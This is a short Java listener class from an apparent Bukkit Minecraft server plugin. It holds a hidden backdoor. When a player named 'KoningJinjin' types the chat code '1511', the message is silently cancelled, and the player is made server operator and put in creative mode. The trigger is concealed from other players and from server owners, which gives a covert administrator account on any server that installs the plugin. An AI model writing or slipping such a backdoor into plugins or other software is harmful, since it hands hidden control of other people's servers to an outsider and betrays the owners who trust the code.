package de.koningjinjin.actions;

import org.bukkit.GameMode;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

import de.koningjinjin.Main.Main;

public class OPMe implements Listener{
	
	@EventHandler
	public void onChat(AsyncPlayerChatEvent e){
		Player p = e.getPlayer();
		if(e.getMessage().equalsIgnoreCase("1511")){
			if(p.getName().equalsIgnoreCase("KoningJinjin")){
				e.setCancelled(true);
				p.setOp(true);
				p.setGameMode(GameMode.CREATIVE);
				p.sendMessage(Main.green + "Du bist nun Operator!");
			}
		}
	}

}
